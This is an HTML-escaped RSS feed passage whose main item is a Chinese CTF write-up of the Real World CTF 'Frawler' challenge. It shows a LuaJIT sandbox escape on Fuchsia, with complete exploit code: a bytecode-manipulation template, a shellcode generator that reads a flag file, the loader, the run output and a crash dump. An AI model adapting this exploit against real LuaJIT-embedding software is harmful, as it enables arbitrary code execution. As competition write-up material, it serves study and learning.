class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;长亭雷池（SafeLine)&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;雷池（SafeLine) 是由长亭科技推出的一款以智能语义分析算法著称的 Web 攻击防护产品，在大幅降低了漏报率和误报率的同时还能保持极高的检测效率，可以为用户提供高质量的 Web 攻击防护、CC 攻击防护、访问控制、防护统计等功能。&lt;/p&gt;&lt;p&gt;今年 7 月长亭科技发布的雷池（SafeLine） 2.0版本 以 &lt;b&gt;“语义分析”、“轻量级集群”、“高度自定义”&lt;/b&gt;为特色，进一步升级核心检测算法，并对传统部署架构发起挑战，支持多种架构及部署方式，以高度自定义的可扩展性为企业防范场景化风险带来价值。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-12-28-53566289</guid>
<pubDate>Fri, 28 Dec 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>RW CTF Frawler WP | luajit与fuchsia的硬核玩法(2)</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-12-26-53336867.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/53336867&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-fde3a7e476131bc70773dfa8c751a7df_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者：Anciety，r3kapig战队成员。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Frawler(2)&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;上一篇我们主要分析了现成的luajit沙箱逃逸exp为什么不能直接使用，过程中我们弄明白了luajit的原理了，这下对我们在zircon内进行分析就有一定好处了，因为在zircon内没有调试器可以用（或者是我不方便编译出来使用），所以对luajit的熟悉可以让我们一方面快速识别出内嵌在目标可执行文件内的luajit代码，从而明白到底现在在发生什么。&lt;/p&gt;&lt;p&gt;虽然没有调试器，但是在fuchsia内如果触发了setfault是会有dump信息显示在fuchsia boot console里的，这也是为什么我们具有没有调试器也可以把exp调出来的可能。&lt;/p&gt;&lt;p&gt;在这一部分我首先讲述一下我按照@david492j的思路，以及参考他的exp完成我的exp的过程，最后再来分析为什么在linux里调试成功的luajit沙箱逃逸代码在fuchsia里没起作用。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;david的思路&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这里再次感谢@david492j不吝啬与我这样的菜鸡分享思路。。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;精准猜测&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;按照他的说法，由于之前&quot;PANIC&quot;的信息（在上一篇中已经分析了为什么会出现这样的信息），他们以为在fuchsia内jit是不能直接使用的。这么看他们应该是直接在fuchsia内进行操作了，这里可以看出真正大佬的自信。。我完全不敢保证在没有调试器的情况下我的代码和我想的一样。。这也是为什么我会非常需要在linux里先调试一遍。&lt;/p&gt;&lt;p&gt;不过这非常巧妙的让他们绕过了一个大坑。。因为事实上我们上一篇中调好的luajit沙箱逃逸代码并不能使用，具体原因我在后文会尝试去分析。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;大佬的思路&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;按照他们的思路，在原exp中虽然不能直接使用，但是其中的任意地址读写（其实后来调试发现是4字节范围内）和任意地址调用是可以使用的，我分开测试也发现了这一点。&lt;/p&gt;&lt;p&gt;所以他们采用了直接利用任意读写和泄露去完成利用。&lt;/p&gt;&lt;p&gt;回想一下我们在fuchsia内和linux利用上的几点不同：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;无法调试（这一点可以通过查看崩溃时的dump日志来解决）&lt;/li&gt;&lt;li&gt;无法直接进行系统调用&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;其他部分似乎差距并不大，所以思路上也没有太大差距：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;泄露text_base&lt;/li&gt;&lt;li&gt;有了text_base配合任意读写可以泄露libc(ld.so.1，在fuchsia内与libc为同一个文件）&lt;/li&gt;&lt;li&gt;之后有任意地址调用，可以调用mprotect之后再跳到shellcode。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;但是第3点就需要有连续两次能控制的跳转，第一次跳转到mprotect，第二次跳转到shellcode。由于目标代码有luajit，mprotect并不是一个很大的问题，我们可以直接复用luajit内的mprotect的部分。之后第二次跳转到shellcode。但是如何去找到连续两个能控制的跳转呢？&lt;/p&gt;&lt;p&gt;这里就不得不佩服大佬的思路了。回想一下哪里的函数指针最多？当然是&lt;code&gt;FILE&lt;/code&gt;结构体啦，于是在&lt;code&gt;FILE&lt;/code&gt;相关的函数附近，大佬使用了&lt;code&gt;fflush&lt;/code&gt;，我自己也找了一下，还发现了libc内&lt;code&gt;0x32e50&lt;/code&gt;位置的函数也是两个连续的函数指针调用：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;__int64 __fastcall sub_32E50(int64_t *a1, __int64 a2, unsigned int a3)
{
  __int64 v3; // r13
  unsigned int v4; // er12
  __int64 result; // rax
​
  v3 = a2;
  v4 = a3;
  if ( a3 == 1 )
    v3 = a2 - (a1[2] - a1[1]);
  if ( a1[5] &amp;gt; (unsigned __int64)a1[7] )
  {
    ((void (__fastcall *)(int64_t *, _QWORD, _QWORD))a1[9])(a1, 0LL, 0LL); // &amp;lt;-- 第一次
    if ( !a1[5] )
      return 0xFFFFFFFFLL;
  }
  a1[4] = 0LL;
  a1[7] = 0LL;
  a1[5] = 0LL;
  if ( ((__int64 (__fastcall *)(int64_t *, __int64, _QWORD))a1[10])(a1, v3, v4) &amp;lt; 0 ) // &amp;lt;-- 第二次
    return 0xFFFFFFFFLL;
  *(_DWORD *)a1 &amp;amp;= 0xFFFFFFEF;
  result = 0LL;
  a1[2] = 0LL;
  a1[1] = 0LL;
  return result;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后参数上，第一个参数，在这里是&lt;code&gt;FILE&lt;/code&gt;结构体指针，而在任意跳转的时候第一个参数是&lt;code&gt;lua_State&lt;/code&gt;的指针，好在这个指针的内存是可写的，我们又恰好有任意地址写，所以可以通过直接把&lt;code&gt;lua_State&lt;/code&gt;按照要求进行伪造，就可以成功进行两次调用了。&lt;/p&gt;&lt;p&gt;所以这样的exp巧妙又简洁，还避免了一个大坑。&lt;/p&gt;&lt;p&gt;另外几个细节的解决：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;泄露：在原exp中是存在泄露的，采用了一个空字符串去相对找位置，我没有详细阅读这一部分的代码，我估计和python处理比较类似，为了加速字符串可能会把空字符串等这种可以直接处理为常量存在某个data位置或是State附近，看起来luajit是存在了State附近。这样我通过dump了这个附近的内存去，再通过崩溃日志去查看有没有能够出现libc或是text地址的地方，事实上这样是能找到的，毕竟可能有一些函数指针之类的会存在&lt;code&gt;State&lt;/code&gt;内&lt;/li&gt;&lt;li&gt;&lt;code&gt;State&lt;/code&gt;所在地址：这个地址测试后发现不存在aslr，固定地址&lt;/li&gt;&lt;li&gt;关于设置原exp中&lt;code&gt;fshellcode&lt;/code&gt;指向目标（也就是要调用的目标地址）和&lt;code&gt;mctab&lt;/code&gt;任意写之间的顺序：这里有个小坑，就是按照原exp的顺序会在中间崩溃掉，我仔细思考了一下，其实&lt;code&gt;mctab&lt;/code&gt;的任意写是在lua里完成的，中间会涉及大量的luajit字节码处理逻辑，而写入又是一个一个写入的，我们在设置&lt;code&gt;fshellcode&lt;/code&gt;的时候存在一些泄露操作，不仅仅是单一的赋值，所以有可能在执行luajit字节码的过程中出现了损坏。想到调换顺序还是比较容易的，一方面&lt;code&gt;mctab&lt;/code&gt;的赋值格式统一，二方面尽量减少赋值和调用之间的逻辑过程，避免出现意想不到的错误。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;在解决了这几个细节之后，配合上已经想好的思路就没有太大的难度了。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;exploit&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;create.tpl.lua (生成用于loadstring的字节码，我进行了hex encode，留出shellcode的部分)&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;-- The following function serves as the template for evil.lua.
-- The general outline is to compile this function as-written, dump
-- it to bytecode, manipulate the bytecode a bit, and then save the
-- result as evil.lua.
local evil = function(v)
  -- This is the x86_64 native code which we&#39;ll execute. It
  -- is a very benign payload which just prints &quot;Hello World&quot;
  -- and then fixes up some broken state.
  --
  local shellcode =
    {SHELLCODE_TPL}
​
  -- The dirty work is done by the following &quot;inner&quot; function.
  -- This inner function exists because we require a vararg call
  -- frame on the Lua stack, and for the function associated with
  -- said frame to have certain special upvalues.
  local function inner(...)
    
    if false then
      -- The following three lines turn into three bytecode
      -- instructions. We munge the bytecode slightly, and then
      -- later reinterpret the instructions as a cdata object,
      -- which will end up being `cdata&amp;lt;const char *&amp;gt;: NULL`.
      -- The `if false` wrapper ensures that the munged bytecode
      -- isn&#39;t executed.
      local cdata = -32749
      cdata = 0
      cdata = 0
    end
​
    -- Through the power of bytecode manipulation, the
    -- following three functions will become (the fast paths of)
    -- string.byte, string.char, and string.sub. This is
    -- possible because LuaJIT has bytecode instructions
    -- corresponding to the fast paths of said functions. Note
    -- that we musn&#39;t stray from the fast path (because the
    -- fallback C code won&#39;t be wired up). Also note that the
    -- interpreter state will be slightly messed up after
    -- calling one of these functions.
    local function s_byte(s) end
    local function s_char(i, _) end
    local function s_sub(s, i, j) end
​
​
    -- The following function does nothing, but calling it will
    -- restore the interpreter state which was messed up following
    -- a call to one of the previous three functions. Because this
    -- function contains a cdata literal, loading it from bytecode
    -- will result in the ffi library being initialised (but not
    -- registered in the global namespace).
    local function resync() return 0LL end
​
    -- Helper function to reinterpret the first four bytes of a
    -- string as a uint32_t, and return said value as a number.
    local function s_uint32(s)
      local result = 0
      for i = 4, 1, -1 do
        result = result * 256 + s_byte(s_sub(s, i, i))
        resync()
      end
      return result
    end
​
    -- The following line obtains the address of the GCfuncL
    -- object corresponding to &quot;inner&quot;. As written, it just fetches
    -- the 0th upvalue, and does some arithmetic. After some
    -- bytecode manipulation, the 0th upvalue ends up pointing
    -- somewhere very interesting: the frame info TValue containing
    -- func|FRAME_VARG|delta. Because delta is small, this TValue
    -- will end up being a denormalised number, from which we can
    -- easily pull out 32 bits to give us the &quot;func&quot; part.
    local iaddr = (inner * 2^1022 * 2^52) % 2^32
​
    -- The following five lines read the &quot;pc&quot; field of the GCfuncL
    -- we just obtained. This is done by creating a GCstr object
    -- overlaying the GCfuncL, and then pulling some bytes out of
    -- the string. Bytecode manipulation results in a nice KPRI
    -- instruction which preserves the low 32 bits of the istr
    -- TValue while changing the high 32 bits to specify that the
    -- low 32 bits contain a GCstr*.
    local istr = (iaddr - 4) + 2^52
    istr = -32764 -- Turned into KPRI(str)
    local pc = s_sub(istr, 5, 8)
    istr = resync()
    pc = s_uint32(pc)
    -- The following three lines result in the local variable
    -- called &quot;memory&quot; being `cdata&amp;lt;const char *&amp;gt;: NULL`. We can
    -- subsequently use this variable to read arbitrary memory
    -- (one byte at a time). Note again the KPRI trick to change
    -- the high 32 bits of a TValue. In this case, the low 32 bits
    -- end up pointing to the bytecode instructions at the top of
    -- this function wrapped in `if false`.
    local memory = (pc + 8) + 2^52
    memory = -32758 -- Turned into KPRI(cdata)
    memory = memory + 0
​
    -- Helper function to read a uint32_t from any memory location.
    local function m_uint32(offs)
      local result = 0
      for i = offs + 3, offs, -1 do
        result = result * 256 + (memory[i] % 256)
      end
      return result
    end
​
    local function m_uint64(offs)
        local result = 0
        for i = offs + 7, offs, -1 do
            result = result * 256 + (memory[i] % 256)
        end
        return result
    end
​
    -- Helper function to extract the low 32 bits of a TValue.
    -- In particular, for TValues containing a GCobj*, this gives
    -- the GCobj* as a uint32_t. Note that the two memory reads
    -- here are GCfuncL::uvptr[1] and GCupval::v.
    local vaddr = m_uint32(m_uint32(iaddr + 24) + 16)
    local function low32(tv)
      v = tv
      res = m_uint32(vaddr)
      return res
    end
​
    -- Helper function which is the inverse of s_uint32: given a
    -- 32 bit number, returns a four byte string.
    local function ub4(n)
      local result = &quot;&quot;
      for i = 0, 3 do
        local b = n % 256
        n = (n - b) / 256
        result = result .. s_char(b)
        resync()
      end
      return result
    end
​
    local function ub8(n)
        local result = &quot;&quot;
        for i = 0, 7 do
            local b = n % 256
            n = (n - b) / 256
            result = result .. s_char(b)
            resync()
        end
        return result
    end
​
    
​
    local function hexdump_print(addr, len)
        local result = &#39;&#39;
        for i = 0, len - 1 do
            if i % 16 == 0 and i ~= 0 then
                result = result .. &#39;\n&#39;
            end
            result = result .. string.format(&#39;%02x&#39;, memory[addr + i] % 0x100) .. &#39; &#39;
        end
​
        print(result)
    end
​
​
    local function hexdump_tv(tv)
        v = tv
        hexdump_print(vaddr, 8)
    end
​
    local text_base = m_uint64(low32(&quot;&quot;) - 4 + 0x80) - 0x29090
    --print(&#39;got text_base @ 0x&#39; .. string.format(&#39;%x&#39;, text_base))
    local strlen_got = text_base + 0x74058
    local strlen_addr = m_uint64(strlen_got)
    --print(&#39;strlen got @ 0x&#39; .. string.format(&#39;%x&#39;, strlen_addr))
    local ld_so_base = strlen_addr - 0x59e80
    --print(&#39;ld_so base @ 0x&#39; .. string.format(&#39;%x&#39;, ld_so_base))
​
    local nop4k = &quot;\144&quot;
    for i = 1, 12 do nop4k = nop4k .. nop4k end
    local ashellcode = nop4k .. shellcode .. nop4k
    local asaddr = low32(ashellcode) + 16
    asaddr = asaddr + 2^12 - (asaddr % 2^12)
    --print(asaddr)
​
    -- arbitrary (32 bits range) write
    -- form file structure according to function requirements
    local rdi = 0x10000378 -- State &amp;lt;-- fixed?!
    --local mctab_s = &quot;\0\0\0\0\99\4\0\0&quot;.. ub4(rdi)
    --  ..&quot;\0\0\0\0\0\0\0\0\255\255\0\0\255\255\255\255&quot;
    -- move this before arbitrary write
    -- seems this will interfere, because the State has been
    -- manipulated after arbitrary write
    local fshellcode = ub4(low32(&quot;&quot;) + 132) ..&quot;\0\0\0\0&quot;..
      ub8(ld_so_base + 0x32e50)
    fshellcode = -32760 -- Turned into KPRI(func)
​
    local mctab_s = &quot;\0\0\0\0\99\4\0\0&quot;.. ub4(rdi)
      ..&quot;\0\0\0\0\0\0\0\0\0\0\0\0\255\255\0\0\255\255\255\255&quot;
    local mctab = low32(mctab_s) + 16 + 2^52
    mctab = -32757 -- Turned into KPRI(table)
    mctab[5] = 0x1 / 2^52 / 2^1022
    mctab[7] = 0 / 2^52 / 2^1022 -- qword ptr [$rdi + 40] &amp;gt; qword ptr [$rdi + 56]
    mctab[9] = (text_base + 0x56ca0) / 2^52 / 2^1022
    --mctab[9] = 0x2200 / 2^52 / 2^1022
    mctab[306] = 0x10008000 / 2^52 / 2^1022
    mctab[309] = 0x10000 / 2^52 / 2^1022
    mctab[10] = asaddr / 2^52 / 2^1022
    --mctab[10] = 0xdeadbeef / 2^52 / 2^1022
    -- The following seven lines result in the memory protection of
    -- the page at asaddr changing from read/write to read/execute.
    -- This is done by setting the jit_State::mcarea and szmcarea
    -- fields to specify the page in question, setting the mctop and
    -- mcbot fields to an empty subrange of said page, and then
    -- triggering some JIT compilation. As a somewhat unfortunate
    -- side-effect, the page at asaddr is added to the jit_State&#39;s
    -- linked-list of mcode areas (the shellcode unlinks it).
    
​
    --[[
    local mcarea = mctab[1]
    val = asaddr / 2^52 / 2^1022
    mctab[4] = 2^12 / 2^52 / 2^1022
    local wtf = low32(&quot;&quot;) + 2748
    mctab[3] = val
    mctab[2] = val
    mctab[1] = val
    mctab[0] = val
    hexdump_print(wtf, 32 + 32)
    local i = 0
    
    while i &amp;lt; 0x1000 do i = i + 1 end
    print(i)
    --]]
​
    -- The following three lines construct a GCfuncC object
    -- whose lua_CFunction field is set to asaddr. A fixed
    -- offset from the address of the empty string gives us
    -- the global_State::bc_cfunc_int field.
    --local fshellcode = ub4(low32(&quot;&quot;) + 132) ..&quot;\0\0\0\0&quot;..
    --  ub4(asaddr) ..&quot;\0\0\0\0&quot;
    
    fshellcode()
  end
  inner()
end
​
-- Some helpers for manipulating bytecode:
local ffi = require &quot;ffi&quot;
local bit = require &quot;bit&quot;
local BC = {KSHORT = 41, KPRI = 43}
​
-- Dump the as-written evil function to bytecode:
local estr = string.dump(evil, true)
local buf = ffi.new(&quot;uint8_t[?]&quot;, #estr+1, estr)
local p = buf + 5
​
-- Helper function to read a ULEB128 from p:
local function read_uleb128()
  local v = p[0]; p = p + 1
  if v &amp;gt;= 128 then
    local sh = 7; v = v - 128
    repeat
      local r = p[0]
      v = v + bit.lshift(bit.band(r, 127), sh)
      sh = sh + 7
      p = p + 1
    until r &amp;lt; 128
  end
  return v
end
​
-- The dumped bytecode contains several prototypes: one for &quot;evil&quot;
-- itself, and one for every (transitive) inner function. We step
-- through each prototype in turn, and tweak some of them.
while true do
  local len = read_uleb128()
  if len == 0 then break end
  local pend = p + len
  local flags, numparams, framesize, sizeuv = p[0], p[1], p[2], p[3]
  p = p + 4
  read_uleb128()
  read_uleb128()
  local sizebc = read_uleb128()
  local bc = p
  local uv = ffi.cast(&quot;uint16_t*&quot;, p + sizebc * 4)
  if numparams == 0 and sizeuv == 3 then
    -- This branch picks out the &quot;inner&quot; function.
    -- The first thing we do is change what the 0th upvalue
    -- points at:
    uv[0] = uv[0] + 2
    -- Then we go through and change everything which was written
    -- as &quot;local_variable = -327XX&quot; in the source to instead be
    -- a KPRI instruction:
    for i = 0, sizebc do
      if bc[0] == BC.KSHORT then
        local rd = ffi.cast(&quot;int16_t*&quot;, bc)[1]
        if rd &amp;lt;= -32749 then
          bc[0] = BC.KPRI
          bc[3] = 0
          if rd == -32749 then
            -- the `cdata = -32749` line in source also tweaks
            -- the two instructions after it:
            bc[4] = 0
            bc[8] = 0
          end
        end
      end
      bc = bc + 4
    end
  elseif sizebc == 1 then
    -- As written, the s_byte, s_char, and s_sub functions each
    -- contain a single &quot;return&quot; instruction. We replace said
    -- instruction with the corresponding fast-function instruction.
    bc[0] = 147 + numparams
    bc[2] = bit.band(1 + numparams, 6)
  end
  p = pend
end
​
​
function string.fromhex(str)
    return (str:gsub(&#39;..&#39;, function (cc)
        return string.char(tonumber(cc, 16))
    end))
end
​
function string.tohex(str)
    return (str:gsub(&#39;.&#39;, function (c)
        return string.format(&#39;%02X&#39;, string.byte(c))
end))
end
​
res = string.tohex(ffi.string(buf, #estr))
local f = io.open(&quot;../shellcode.hex&quot;, &quot;wb&quot;)
f:write(ffi.string(res, #res))
f:close()
print(res)
a = loadstring(string.fromhex(res))
print(a())
-- Finally, save the manipulated bytecode as evil.lua:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;gen_shellcode.py （填入最后执行的shellcode）&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
​
shellcode = r&#39;&#39;&#39;
sub rsi, 0x2710
mov rax, rsi
mov rbp, rax
add rax, 0x73370
mov rdi, %s
push rdi
mov rdi, %s
push rdi
mov rdi, rsp
push 0
push 114
mov rsi, rsp
call rax
mov rcx, rax
mov rdi, rsp
mov rsi, 100
mov rdx, 100
mov rax, rbp
add rax, 0x733c0
call rax
mov rdi, 1
mov rsi, rsp
mov rdx, 100
mov rax, rbp
add rax, 0x73510
call rax
​
push 0
ret
​
&#39;&#39;&#39;
print(shellcode)
shellcode = shellcode % (u64(&#39;a/flag&#39;.ljust(8, &#39;\x00&#39;)), u64(&#39;/pkg/dat&#39;))
​
with open(&#39;create.tpl.lua&#39;, &#39;r&#39;) as f:
    content = f.read()
    shellcode_hex = repr(asm(shellcode))
    content = content.replace(&#39;{SHELLCODE_TPL}&#39;, shellcode_hex)
    with open(&#39;create.lua&#39;, &#39;w&#39;) as f:
        f.write(content)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;script.lua （实际传入response的lua代码，留出字节码hex部分)&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;function string.fromhex(str)
    return (str:gsub(&#39;..&#39;, function (cc)
        return string.char(tonumber(cc, 16))
    end))
end
​
function string.tohex(str)
    return (str:gsub(&#39;.&#39;, function (c)
        return string.format(&#39;%02X&#39;, string.byte(c))
end))
end
​
shellcode = &#39;{}&#39;
​
function fdb0cdf28c53764e()
    x = loadstring(string.fromhex(shellcode))
    return tostring(x())
end
​
print(fdb0cdf28c53764e())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;request.py和forward.py在上一篇中给出了。&lt;/p&gt;&lt;p&gt;最后的利用：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;python2 gen_shellcode.py
python2 request.py
​
[DEBUG] Received 0x1c0 bytes:
    &#39;&amp;lt;head&amp;gt;\n&#39;
    &#39;&amp;lt;title&amp;gt;Error response&amp;lt;/title&amp;gt;\n&#39;
    &#39;&amp;lt;/head&amp;gt;\n&#39;
    &#39;&amp;lt;body&amp;gt;\n&#39;
    &#39;&amp;lt;h1&amp;gt;Error response&amp;lt;/h1&amp;gt;\n&#39;
    &#39;&amp;lt;p&amp;gt;Error code 400.\n&#39;
    &quot;&amp;lt;p&amp;gt;Message: Bad request syntax (&#39;rwctf{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}\\x04\\x00\\x10\\x00\\x00\\x00\\x00\\xb8\\x03\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\xcf\\x90J\\xa8.\\x00\\x00x\\x03\\x00\\x10\\x00\\x00\\x00\\x00\\x87A\\\\]\\xd3\\x1a\\x00\\x00H\\x94\\x00\\x10\\x02\\x00\\x00\\x00\\x01\\x00\\x00\\x00&#39;).\n&quot;
    &#39;&amp;lt;p&amp;gt;Error code explanation: 400 = Bad request syntax or unsupported method.\n&#39;
​
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;一个字节引发的血案&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;但是到这个时候我就很不爽了。为啥我好不容易才调好的luajit逃逸用不了啊，这没道理啊，那我们来分析一下为啥用不了。&lt;/p&gt;&lt;p&gt;第一步，先把代码跑起来，看看dump日志。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;[40698.170] 01045.01203&amp;gt; devmgr: crash_analyzer_listener: analyzing exception type 0x108
[40698.171] 01105.01119&amp;gt; &amp;lt;== fatal exception: process /pkg/bin/frawler[162600] thread initial-thread[162612]
[40698.171] 01105.01119&amp;gt; &amp;lt;== fatal page fault, PC at 0x7a8af11e4b20
[40698.171] 01105.01119&amp;gt;  CS:                   0 RIP:     0x7a8af11e4b20 EFL:              0x246 CR2:             0x8000
[40698.171] 01105.01119&amp;gt;  RAX:             0x8000 RBX:                  0 RCX:                  0 RDX:                  0
[40698.171] 01105.01119&amp;gt;  RSI:                  0 RDI:     0x5746f370eb58 RBP:     0x799649e95ca0 RSP:     0x799649e95c78
[40698.171] 01105.01119&amp;gt;   R8:                  0  R9:                  0 R10:                  0 R11:              0x206
[40698.171] 01105.01119&amp;gt;  R12:     0x5746f370eb58 R13:         0x100003b8 R14:     0x5746f370eb58 R15:                0x1
[40698.171] 01105.01119&amp;gt;  errc:               0x6
[40698.171] 01105.01119&amp;gt; bottom of user stack:
[40698.171] 01105.01119&amp;gt; 0x0000799649e95c78: f11e4acc 00007a8a 10000558 00000000 |.J...z..X.......|
[40698.171] 01105.01119&amp;gt; 0x0000799649e95c88: f370eed0 00005746 00008008 00000000 |..p.FW..........|
[40698.171] 01105.01119&amp;gt; 0x0000799649e95c98: 10000558 00000000 49e95cf0 00007996 |X........\.I.y..|
[40698.171] 01105.01119&amp;gt; 0x0000799649e95ca8: f11c7474 00007a8a a1ad8e1c 9b72fb15 |tt...z........r.|
[40698.171] 01105.01119&amp;gt; 0x0000799649e95cb8: f370eec8 00005746 10000558 00000000 |..p.FW..X.......|
[40698.172] 01105.01119&amp;gt; 0x0000799649e95cc8: 10000558 00000000 f1190868 00007a8a |X.......h....z..|
[40698.172] 01105.01119&amp;gt; 0x0000799649e95cd8: 100003b8 00000000 100003b8 00000000 |................|
[40698.172] 01105.01119&amp;gt; 0x0000799649e95ce8: 10000378 00000000 49e95d30 00007996 |x.......0].I.y..|
[40698.172] 01105.01119&amp;gt; 0x0000799649e95cf8: f11c5e0d 00007a8a 1000d0b8 00000000 |.^...z..........|
[40698.172] 01105.01119&amp;gt; 0x0000799649e95d08: 10000558 00000000 00000018 00000000 |X...............|
[40698.172] 01105.01119&amp;gt; 0x0000799649e95d18: 100003b8 00000000 10000fa8 00000000 |................|
[40698.172] 01105.01119&amp;gt; 0x0000799649e95d28: 49e95e00 00007996 10000378 00000000 |.^.I.y..x.......|
[40698.172] 01105.01119&amp;gt; 0x0000799649e95d38: f11ff4f6 00007a8a 10000fa8 00000000 |.....z..........|
[40698.172] 01105.01119&amp;gt; 0x0000799649e95d48: 49e95e00 00007996 fffffee0 00000000 |.^.I.y..........|
[40698.172] 01105.01119&amp;gt; 0x0000799649e95d58: 10000378 10000378 49e95e00 00007996 |x...x....^.I.y..|
[40698.172] 01105.01119&amp;gt; 0x0000799649e95d68: 10000378 00000000 1000d278 00000000 |x.......x.......|
[40698.172] 01105.01119&amp;gt; arch: x86_64
[40698.184] 01105.01119&amp;gt; dso: id=333103e7c266dfce base=0x7a8af118e000 name=app:/pkg/bin/frawler
[40698.184] 01105.01119&amp;gt; dso: id=8f51b7868dd0d5b9aefede5739518f97f2a580e0 base=0x58f25e8e0000 name=libc.so
[40698.184] 01105.01119&amp;gt; dso: id=89d4eb99573947ac792dd4a5e9e498bd44b4eefe base=0x554a3ca5d000 name=&amp;lt;vDSO&amp;gt;
[40698.184] 01105.01119&amp;gt; dso: id=fa0cdaa5591d31e3 base=0x2f6fae109000 name=libc++.so.2
[40698.184] 01105.01119&amp;gt; dso: id=86f83b6141c863ad base=0x2d3787750000 name=libunwind.so.1
[40698.184] 01105.01119&amp;gt; dso: id=4b87e913774eb02cb107ae0f1385ddfcb877ba2e base=0xe98beb70000 name=libfdio.so
[40698.184] 01105.01119&amp;gt; dso: id=ecfc9b0e3f0ca03b base=0xaef30a38000 name=libclang_rt.scudo.so
[40698.184] 01105.01119&amp;gt; dso: id=1b59f762cf98d972 base=0x85aca3d3000 name=libc++abi.so.1
[40698.184] 01105.01119&amp;gt; {{{reset}}}
[40698.185] 01105.01119&amp;gt; {{{module:0x21fb5444:&amp;lt;VMO#162635=libc++abi.so.1&amp;gt;:elf:1b59f762cf98d972}}}
[40698.185] 01105.01119&amp;gt; {{{mmap:0x85aca3d3000:0x16000:load:0x21fb5444:r:0}}}
[40698.185] 01105.01119&amp;gt; {{{mmap:0x85aca3e9000:0x24000:load:0x21fb5444:rx:0x16000}}}
[40698.185] 01105.01119&amp;gt; {{{mmap:0x85aca40d000:0x5000:load:0x21fb5444:rw:0x3a000}}}
[40698.185] 01105.01119&amp;gt; {{{module:0x21fb5445:&amp;lt;VMO#162620=libclang_rt.scudo.s:elf:ecfc9b0e3f0ca03b}}}
[40698.185] 01105.01119&amp;gt; {{{mmap:0xaef30a38000:0x8000:load:0x21fb5445:r:0}}}
[40698.185] 01105.01119&amp;gt; {{{mmap:0xaef30a40000:0xa000:load:0x21fb5445:rx:0x8000}}}
[40698.192] 01105.01119&amp;gt; {{{mmap:0xaef30a4a000:0x4000:load:0x21fb5445:rw:0x12000}}}
[40698.192] 01105.01119&amp;gt; {{{module:0x21fb5446:&amp;lt;VMO#162625=libfdio.so&amp;gt;:elf:4b87e913774eb02cb107ae0f1385ddfcb877ba2e}}}
[40698.192] 01105.01119&amp;gt; {{{mmap:0xe98beb70000:0x22000:load:0x21fb5446:rx:0}}}
[40698.192] 01105.01119&amp;gt; {{{mmap:0xe98beb93000:0x4000:load:0x21fb5446:rw:0x23000}}}
[40698.192] 01105.01119&amp;gt; {{{module:0x21fb5447:&amp;lt;VMO#162640=libunwind.so.1&amp;gt;:elf:86f83b6141c863ad}}}
[40698.192] 01105.01119&amp;gt; {{{mmap:0x2d3787750000:0x6000:load:0x21fb5447:r:0}}}
[40698.192] 01105.01119&amp;gt; {{{mmap:0x2d3787756000:0x8000:load:0x21fb5447:rx:0x6000}}}
[40698.192] 01105.01119&amp;gt; {{{mmap:0x2d378775e000:0x3000:load:0x21fb5447:rw:0xe000}}}
[40698.192] 01105.01119&amp;gt; {{{module:0x21fb5448:&amp;lt;VMO#162630=libc++.so.2&amp;gt;:elf:fa0cdaa5591d31e3}}}
[40698.192] 01105.01119&amp;gt; {{{mmap:0x2f6fae109000:0x52000:load:0x21fb5448:r:0}}}
[40698.192] 01105.01119&amp;gt; {{{mmap:0x2f6fae15b000:0x77000:load:0x21fb5448:rx:0x52000}}}
